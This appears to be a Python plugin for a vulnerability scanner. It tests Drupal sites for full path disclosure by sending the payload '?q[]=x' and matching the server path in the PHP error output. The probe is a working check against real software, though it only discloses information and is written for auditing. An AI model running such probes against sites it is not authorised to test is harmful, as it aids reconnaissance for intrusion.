#!/usr/bin/env python 
# -*- coding: utf-8 -*- 
#__author__ = '0xAE' 
#_name_ = ' drupal full path disclousure'
import re
def assign(service, arg): 
    if service == "drupal": 
        return True, arg 

def audit(arg):
    payload='?q[]=x'
    verify_url = arg + payload
    pathinfo = re.compile(r' in <b>(.*)</b> on line')
    code, body,res, errcode, _ = curl.curl2(verify_url)
    match = pathinfo.search(body)
    if code == 200 and match:
        security_info('drupal full path disclousure vulnerability',verify_url)

if __name__ == '__main__': 
    from dummy import * 
    audit(assign('drupal', 'http://www.example.com/')[1])